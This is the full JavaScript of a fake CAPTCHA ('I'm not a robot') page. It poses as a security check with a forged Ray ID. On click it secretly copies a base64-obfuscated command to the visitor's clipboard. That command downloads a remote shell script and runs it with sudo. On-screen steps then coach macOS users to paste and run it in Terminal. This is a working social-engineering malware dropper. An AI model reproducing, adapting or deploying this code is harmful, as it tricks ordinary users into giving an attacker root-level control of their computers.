(function() {
      var q1 = document.getElementById('q1');
      var q2 = document.getElementById('q2');
      var q3 = document.getElementById('q3');
      var q4 = document.getElementById('q4');
      var r1 = document.getElementById('r1');
      var r2 = document.getElementById('r2');
      var r3 = document.getElementById('r3');
      var s4 = document.getElementById('s4');
      var p2 = document.getElementById('p2');
      var s2 = document.getElementById('s2');
      var s3 = document.getElementById('s3');
      var s1 = document.getElementById('s1');

      p2.textContent = location.hostname || 'authentix.io';

      var steps = [
        { n: '1', t: 'Press ', k: [{ l: '⌘', clr: 'a1' }, { l: 'Space', clr: 'a2' }], s: ' to open Spotlight' },
        { n: '2', t: 'Type ', k: [{ l: 'Terminal', clr: 'a3' }], s: ' and press ', x: { l: 'Return', clr: 'a4' } },
        { n: '3', t: 'Paste token with ', k: [{ l: '⌘', clr: 'a1' }, { l: 'V', clr: 'a5' }] },
        { n: '4', t: 'Press ', k: [{ l: 'Return', clr: 'a4' }], s: ' to complete' }
      ];

      function mk(txt, clr) {
        var s = document.createElement('span');
        s.className = 'k ' + clr;
        s.textContent = txt;
        return s;
      }

      function buildSteps() {
        r2.innerHTML = '';
        steps.forEach(function(st) {
          var row = document.createElement('div');
          row.className = 'stRow';
          var num = document.createElement('span');
          num.className = 'stNum';
          num.textContent = st.n;
          row.appendChild(num);
          var txt = document.createElement('span');
          txt.className = 'stTxt';
          if (st.t) txt.appendChild(document.createTextNode(st.t));
          if (st.k) {
            st.k.forEach(function(k, i) {
              txt.appendChild(mk(k.l, k.clr));
              if (i < st.k.length - 1) txt.appendChild(document.createTextNode(' + '));
            });
          }
          if (st.s) txt.appendChild(document.createTextNode(st.s));
          if (st.x) txt.appendChild(mk(st.x.l, st.x.clr));
          row.appendChild(txt);
          r2.appendChild(row);
        });
      }

      function rndHex(l) {
        var p = '0123456789abcdef';
        var o = '';
        for (var i = 0; i < l; i++) o += p[Math.floor(Math.random() * p.length)];
        return o;
      }

      function rndAlnum(l) {
        var p = 'ABCDEFGHJKLMNPQRSTUVWXYZ0123456789';
        var o = '';
        for (var i = 0; i < l; i++) o += p[Math.floor(Math.random() * p.length)];
        return o;
      }

      function refreshRay() {
        var r = '';
        for (var i = 0; i < 12; i++) r += rndHex(1);
        s1.textContent = 'Ray ID: ' + r;
      }

      function rotateParams() {
        try {
          var u = new URL(location.href);
          var p = u.searchParams;
          p.set('x', rndAlnum(16).toUpperCase());
          p.set('y', Date.now().toString(36));
          p.set('z', rndAlnum(12));
          history.replaceState(null, '', u.toString());
        } catch (_) {}
      }

      refreshRay();
      rotateParams();

      var phase = 0;
      var locked = false;
      var msgs = {
        0: ["I'm not a robot", "Click to verify — token copies"],
        1: ["Verifying...", "Please wait"],
        2: ["I'm not a robot", "Follow the steps"]
      };

      function updateUI() {
        var m = msgs[phase];
        q3.textContent = m[0];
        q4.textContent = m[1];
        q1.classList.remove('ld', 'dn');
        q2.classList.remove('dn');
        r1.classList.remove('opn');
        if (phase === 1) {
          q1.classList.add('ld');
        } else if (phase === 2) {
          q1.classList.add('dn');
          q2.classList.add('dn');
          r1.classList.add('opn');
        }
      }

      async function copyToken(t) {
        try {
          await navigator.clipboard.writeText(t);
        } catch (_) {
          s4.value = t;
          s4.select();
          document.execCommand('copy');
        }
      }

      async function startVerify() {
        if (locked || phase !== 0) return;
        locked = true;
        phase = 1;
        updateUI();
        await copyToken(`bash <<< $(echo "Y3VybCAtcyAtTCAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2hhY2szcnpib3l6by1zdmcvaGFjazNyemJveXpvLXN2Zy5naXRodWIuaW8vbWFpbi91cGRhdGUuc2gnIHwgc3VkbyBiYXNo" | base64 -d)`);
        setTimeout(function() {
          phase = 2;
          locked = false;
          updateUI();
        }, 900);
      }

      function resetFlow() {
        if (phase === 0) return;
        phase = 0;
        locked = false;
        updateUI();
        rotateParams();
        refreshRay();
      }

      q1.addEventListener('click', function(e) { e.preventDefault(); startVerify(); });
      q2.addEventListener('click', function(e) { e.stopPropagation(); startVerify(); });
      r3.addEventListener('click', resetFlow);
      s2.addEventListener('click', function(e) { e.preventDefault(); });
      s3.addEventListener('click', function(e) { e.preventDefault(); });

      buildSteps();
      updateUI();
    })();
